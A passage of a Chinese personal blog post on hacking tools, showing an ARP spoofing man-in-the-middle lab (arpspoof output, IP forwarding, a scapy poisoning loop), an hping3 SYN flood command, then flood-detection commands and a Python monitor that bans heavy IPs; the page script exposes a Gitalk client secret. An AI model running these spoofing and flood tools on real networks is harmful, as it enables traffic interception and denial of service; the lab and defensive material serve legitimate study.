+<p>原理 ： 发送arp请求，告诉被攻击主机，网关的MAC地址是我的MAC地址，使得流量转发到攻击主机。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kali 攻击主机：192.168.198.128  ether 00:0c:29:c8:79:86 </span><br><span class="line">被攻击主机win7: 192.168.198.133      00:0c:29:ff:57:a0</span><br><span class="line">网关： 192.168.198.2                00:50:56:e1:2d:09</span><br><span class="line"></span><br><span class="line"># -i 网卡 -t target_ip fake_ip</span><br><span class="line">arpspoof -i eth0  -t 192.168.198.133 192.168.198.2</span><br><span class="line">0:c:29:c8:79:86 0:c:29:ff:57:a0 0806 42: arp reply 192.168.198.2 is-at 0:c:29:c8:79:86</span><br><span class="line">0:c:29:c8:79:86 0:c:29:ff:57:a0 0806 42: arp reply 192.168.198.2 is-at 0:c:29:c8:79:86</span><br><span class="line">0:c:29:c8:79:86 0:c:29:ff:57:a0 0806 42: arp reply 192.168.198.2 is-at 0:c:29:c8:79:86</span><br><span class="line">0:c:29:c8:79:86 0:c:29:ff:57:a0 0806 42: arp reply 192.168.198.2 is-at 0:c:29:c8:79:86</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>win7 主机 MAC 表  如看已经欺骗成功，win7 上网失败</p>
+<p><img src="https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231104150600273.png" alt="image-20231104150600273"></p>
+</li>
+</ul>
+<p>停止攻击后：</p>
+<p><img src="https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20231104150828129.png" alt="image-20231104150828129"></p>
+<p>arp 欺骗只需要多一步：</p>
+<p>打开kali 的流量转发功能，这样win7 就可以正常上网，但是流量相当于被劫持了，从kali 走了一道，流量被监控</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python实现</span></span><br><span class="line"><span class="comment"># 告诉被攻击主机我是网关，告诉网关，我是被攻击主机</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arp_flood</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        target_ip = <span class="string">&#x27;192.168.198.133&#x27;</span></span><br><span class="line">        target_MAC = <span class="string">&#x27;00:0c:29:ff:57:a0&#x27;</span></span><br><span class="line">        gateway_ip = <span class="string">&#x27;192.168.198.2&#x27;</span></span><br><span class="line">        gateway_MAC = <span class="string">&#x27;00:50:56:e1:2d:09&#x27;</span></span><br><span class="line">        kali_MAC = <span class="string">&#x27;00:0c:29:c8:79:86&#x27;</span></span><br><span class="line">        <span class="comment"># 发送给被攻击主机</span></span><br><span class="line">        <span class="comment"># op=2 代表响应 op=1 ARP请求</span></span><br><span class="line">        pkg_target = Ether(src=kali_MAC, dst=target_MAC) / ARP(psrc=gateway_ip, pdst=target_ip, hwsrc=kali_MAC,hwdst=target_MAC,op=<span class="number">2</span>)</span><br><span class="line">        send(pkg_target, iface=<span class="string">&quot;eth0&quot;</span>)</span><br><span class="line">        <span class="comment"># 发送给网关</span></span><br><span class="line">        pkg_gateway = Ether(src=kali_MAC, dst=gateway_MAC) / ARP(psrc=target_ip, pdst=gateway_ip, hwsrc=kali_MAC,hwdst=gateway_MAC,op=<span class="number">2</span>)</span><br><span class="line">        send(pkg_gateway, iface=<span class="string">&quot;eth0&quot;</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>hping3 泛洪攻击工具（还是多厉害）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 --flood -S --rand-source -p 端口 目标IP</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>web站点压力测试工具</p>
+<p>ab  wrk 等  netstat -s 可以查看数据包统计情况</p>
+</li>
+</ul>
+<p>7、泛洪攻击的防御相关</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检查 网络连接的数量</span></span><br><span class="line">netstat -ant |wc -l 判断连接是否一直在增加</span><br><span class="line">netstat -ant |grep SYN_RECV  半连接的数量</span><br><span class="line">netstat -s |grep overflowed  可以检查是否出现全连接队列溢出的情况，连接队列溢出会导致无法与服务器建立新连接或者客户端出现大量 connection reset by peer 错误。</span><br><span class="line">netstat -s |grep dropped     半连接队列溢出的情况</span><br><span class="line">top -n 1  只刷新一次就退出，可看出消耗CPU较大的进程</span><br><span class="line">uptime   显示当前时间，运行时间，用户，1分钟，5分钟，15分钟的平均负载</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改系统配置参数，增加TCP连接数量</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">结束消耗CPU的进程或者服务</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">防火墙封禁IP</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"># 检测当前环境是否正在遭受攻击</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 判断当前连接数量是否一直在增加 netstat -ant |wc -l</span><br><span class="line">def connect_add_pers():</span><br><span class="line">    command = &#x27;netstat -ant |wc -l&#x27;</span><br><span class="line">    start = time.time()</span><br><span class="line">    count_start = int(os.popen(command).read())</span><br><span class="line">    while True:</span><br><span class="line">        end = time.time()</span><br><span class="line">        count_end = int(os.popen(command).read())</span><br><span class="line">        if end - start &gt; 1:</span><br><span class="line">            add_connect = count_end - count_start</span><br><span class="line">            break</span><br><span class="line">            # if add_connect &gt; 1000:</span><br><span class="line">            #     return add_connect</span><br><span class="line"></span><br><span class="line">    return add_connect</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># netstat -ant |grep SYN_RECV  半连接的数量</span><br><span class="line"></span><br><span class="line">def half_connect():</span><br><span class="line">    command = &#x27;netstat -ant |grep SYN_RECV|wc -l&#x27;</span><br><span class="line">    count = int(os.popen(command).read())</span><br><span class="line">    return count</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 半连接队列溢出的情况</span><br><span class="line"># 4839240 SYNs to LISTEN sockets dropped</span><br><span class="line">def dropped_half_connect():</span><br><span class="line">    command = &quot;netstat -s |grep &#x27;SYNs to LISTEN sockets dropped&#x27; |awk &#x27;&#123;print $1&#125;&#x27;&quot;</span><br><span class="line">    count = int(os.popen(command).read())</span><br><span class="line">    return count</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 全连接队列溢出的情况</span><br><span class="line"># 809 times the listen queue of a socket overflowed</span><br><span class="line">def dropped_full_connect():</span><br><span class="line">    command = &quot;netstat -s |grep &#x27;times the listen queue of a socket overflowed&#x27; |awk &#x27;&#123;print $1&#125;&#x27;&quot;</span><br><span class="line">    count = int(os.popen(command).read())</span><br><span class="line">    return count</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 找到CPU占用最高的进程</span><br><span class="line">def top_1_process():</span><br><span class="line">    command = (&quot;top -n 1 |head -n 8|tail -n 1 |awk &#x27;&#123;print $2&#125;&#x27; |while read line;do ps -aux |grep $line |head -n 1 &quot;</span><br><span class="line">               &quot;|awk &#x27;&#123;print $11&#125;&#x27;;done&quot;)</span><br><span class="line">    process = os.popen(command).read().strip()</span><br><span class="line">    return process</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 获取每个主机连接到本机的连接数，找到最多的IP，deny</span><br><span class="line">def get_socket_connect():</span><br><span class="line">    count_command = &quot;netstat -ntu | awk &#x27;&#123;print $5&#125;&#x27; | cut -d: -f1 | sort | uniq -c | sort -n |tail -n 1 |awk &#x27;&#123;print $1&#125;&#x27;&quot;</span><br><span class="line">    count_max_socket = int(os.popen(count_command).read())</span><br><span class="line">    if count_max_socket &gt; 100:</span><br><span class="line">        command = &quot;netstat -ntu | awk &#x27;&#123;print $5&#125;&#x27; | cut -d: -f1 | sort | uniq -c | sort -n |tail -n 1 |awk &#x27;&#123;print $2&#125;&#x27;&quot;</span><br><span class="line">        ip = os.popen(command).read().strip()</span><br><span class="line">        print(f&quot;&#123;ip&#125; 连接数为&#123;count_max_socket&#125; ,需要封禁，开始封禁&quot;)</span><br><span class="line">        rule = f&#x27;rule family=&quot;ipv4&quot; source address=&quot;&#123;ip&#125;&quot; reject&#x27;</span><br><span class="line">        all_rules = os.popen(&quot;firewall-cmd --reload &amp;&amp; firewall-cmd --list-all&quot;).read()</span><br><span class="line">        time.sleep(2)</span><br><span class="line">        if rule in all_rules:</span><br><span class="line">            print(f&quot;&#123;rule&#125; 已存在&quot;)</span><br><span class="line">            return</span><br><span class="line">        reject_cmd = f&quot;firewall-cmd --add-rich-rule=&#x27;&#123;rule&#125;&#x27; --permanent&quot;</span><br><span class="line">        # print(reject_cmd)</span><br><span class="line">        reload_cmd = &quot;firewall-cmd --reload&quot;</span><br><span class="line">        # print(reload_cmd)</span><br><span class="line">        result1 = os.popen(reject_cmd).read().strip()</span><br><span class="line">        time.sleep(1)</span><br><span class="line">        result2 = os.popen(reload_cmd).read().strip()</span><br><span class="line">        time.sleep(1)</span><br><span class="line">        if result1 == &#x27;success&#x27; and result2 == &#x27;success&#x27;:</span><br><span class="line">            print(&quot;封禁完成&quot;)</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;封禁失败，请检查&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># uptime 1分钟、5分钟、15分钟内的负载信息</span><br><span class="line"># 如果1分钟的cpu大于50，代表可能遭遇了攻击</span><br><span class="line">def get_cpuload_by_uptime():</span><br><span class="line">    result = os.popen(&#x27;uptime&#x27;).read().strip()</span><br><span class="line">    result = result.replace(&#x27;: &#x27;, &quot;,&quot;)</span><br><span class="line">    result_list = result.split(&quot;,&quot;)</span><br><span class="line">    cpu_1_avg = float(result_list[-3])</span><br><span class="line">    # cpu_5_avg = float(result_list[-2])</span><br><span class="line">    # cpu_15_avg = float(result_list[-1])</span><br><span class="line">    return cpu_1_avg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 采集netstat -ant 的连接数量</span><br><span class="line"># 如果连接大于500 代表可能遭遇了攻击</span><br><span class="line">def get_conn_count_by_netstat():</span><br><span class="line">    command = &#x27;netstat -ant |wc -l&#x27;</span><br><span class="line">    count = int(os.popen(command).read().strip())</span><br><span class="line">    return count</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    # print(f&quot;当前每秒钟连接增加数量为&#123;connect_add_pers()&#125;&quot;)</span><br><span class="line">    # print(f&quot;当前网络中存在的半连接数量为&#123;half_connect()&#125;&quot;)</span><br><span class="line">    # print(f&quot;当前网络中半连接溢出数量为&#123;dropped_half_connect()&#125;&quot;)</span><br><span class="line">    # print(f&quot;当前网络中全连接溢出数量为&#123;dropped_full_connect()&#125;&quot;)</span><br><span class="line">    # print(f&quot;当前系统中占用CPU最高的进程为&#123;top_1_process()&#125;&quot;)</span><br><span class="line">    # while True:</span><br><span class="line">    #     get_socket_connect()</span><br><span class="line">    while True:</span><br><span class="line">        print(f&quot;CPU-Load: &#123;get_cpuload_by_uptime()&#125;,conn-count: &#123;get_conn_count_by_netstat()&#125;&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.jpg" alt="fengchuiguo 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="fengchuiguo 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>fengchuiguo
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://zwjsfdbb.top/2023/10/31/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/%E5%B7%A5%E5%85%B7%E7%AF%87/" title="工具篇">http://zwjsfdbb.top/2023/10/31/黑客工具/工具篇/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/" rel="tag"># 黑客工具</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/10/28/%E7%BC%96%E7%A8%8B/%E5%88%9B%E5%BB%BA%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B/" rel="prev" title="创建远程线程-NtCreateThreadEx">
+      <i class="fa fa-chevron-left"></i> 创建远程线程-NtCreateThreadEx
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/11/01/%E7%BC%96%E7%A8%8B/scapy%E4%BD%BF%E7%94%A8/" rel="next" title="scapy 使用">
+      scapy 使用 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">fengchuiguo</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">90</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">fengchuiguo</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'ba624f1112450ac0437d',
+      clientSecret: '815911bc627d433d1f233c833883b96e335ea413',
+      repo        : 'hexo_discuss',
+      owner       : 'scuzhangzhang',
+      admin       : ['scuzhangzhang'],
+      id          : 'd2deeadcdf2d4595736a6181ac59408a',
+        language: 'zh-CN',
+      distractionFreeMode: false
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
